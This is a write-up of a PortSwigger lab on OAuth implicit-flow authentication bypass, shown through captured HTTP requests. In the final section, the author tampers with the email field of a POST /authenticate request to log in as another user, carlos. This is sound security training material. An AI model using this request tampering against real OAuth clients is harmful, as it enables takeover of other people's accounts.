## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/45027c47-f008-4629-b075-97a0c01591d6)

## Solution :

So as per the lab desc, we have these 2 information.

- Credentials to login as wiener - `wiener"peter`
- Email of carlos - `carlos@carlos-montoya.net`

### Step 1 - Authorization request.

When we click on My-Account to login, the client application sends a *GET* request to the oauth identity provider with the following parameters.

- client_id=`z9hkad7gvzblhg1afh0nx`
- redirect_uri=`https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback`
- response_type=`token`
- nonce=`-1485464675`
- scope=`openid profile email`

```http
GET /auth?client_id=z9hkad7gvzblhg1afh0nx&redirect_uri=https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback&response_type=token&nonce=-1485464675&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a2800000484c182806f1a1a021300a0.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
```

### Step 2 - User login & consent

Once the oauth identity provider receives the request, it redirects the user to a login page for consent.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/7fed1d40-6b9a-4022-8bcd-eeb25e3ecf6f)

On entering the username password, it then asks for permission to access the data.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/cff5143b-4091-44df-8f7b-7b09ee00a948)


### Step 3 - Access token Grant 

The following is the response for the *GET* request to `/auth/nBVHI4q169w7kJlZOkNsp` endpoint. It contains the **Access-token**.

```http
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction_resume=; path=/auth/nBVHI4q169w7kJlZOkNsp; expires=Thu, 01 Jan 1970 00:00:00 GMT; samesite=lax; secure; httponly
Set-Cookie: _session=mt14soA0oxV0nUPeRZTW7; path=/; expires=Fri, 06 Oct 2023 07:02:08 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=mt14soA0oxV0nUPeRZTW7; path=/; expires=Fri, 06 Oct 2023 07:02:08 GMT; secure; httponly
Location: https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback#access_token=mY2Fc2CpZDcIf9NSIrogoJ6kQVVDnGQ7tOgDyi0wCnX&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
Content-Type: text/html; charset=utf-8
Date: Fri, 22 Sep 2023 07:02:08 GMT
Keep-Alive: timeout=5
Content-Length: 459

Redirecting to <a href="https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback#access_token=mY2Fc2CpZDcIf9NSIrogoJ6kQVVDnGQ7tOgDyi0wCnX&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback#access_token=mY2Fc2CpZDcIf9NSIrogoJ6kQVVDnGQ7tOgDyi0wCnX&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>.
```
Note that it is redirecting to `https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback` which means the oauth identity provider is sending the access token to the service provider/client application.

### Step 4 - API call

Once the access-token is received by the client application, it (client application) sends a *GET* request to **/me** endpoint along with the **access-token in the `Authorization:Bearer` header** to grab the information mentioned in the scope.

```http
GET /me HTTP/2
Host: oauth-0aa300f80379b8a4809d9c3102b400e2.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1b007f03f8b82d806a9e160053000d.web-security-academy.net/
Authorization: Bearer p31vSZlwVkOKoqfOjEocLNYQx0ZZ0hxmefKzqG1AE3v
Content-Type: application/json
Origin: https://0a1b007f03f8b82d806a9e160053000d.web-security-academy.net
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
```
### Step 5 - Resource grant 

Now the oauth provider sends back the infomation mentioned in *scope* ie **email** along with the **access-token** to the client application.

```http
POST /authenticate HTTP/2
Host: 0a6e009504bec1c680f81c6b00e80009.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net
Connection: keep-alive
Cookie: session=N5Bwt00wDM1Nxk0ZMoZpwSclvy4gm8Bj
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
"email":"wiener@hotdog.com",
"username":"wiener",
"token":"mY2Fc2CpZDcIf9NSIrogoJ6kQVVDnGQ7tOgDyi0wCnX"
}
```

### Flawed validation by client application 

Logout & Repeat the same oauth login process modify the following *POST* request.

```http
POST /authenticate HTTP/2
Host: 0a6e009504bec1c680f81c6b00e80009.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a6e009504bec1c680f81c6b00e80009.web-security-academy.net
Connection: keep-alive
Cookie: session=N5Bwt00wDM1Nxk0ZMoZpwSclvy4gm8Bj
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
"email":"carlos@carlos-montoya.net",
"username":"wiener",
"token":"mY2Fc2CpZDcIf9NSIrogoJ6kQVVDnGQ7tOgDyi0wCnX"
}
```

Change the *email* parameter to `carlos@carlos-montoya.net` & forward the request. Once the flow is completed,we don't see any error which means the server is not validating the request correctly. Now we are logged in as carlos & thus we've solved the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ed6d6319-de02-474f-93d0-a92fd7b5ab54)
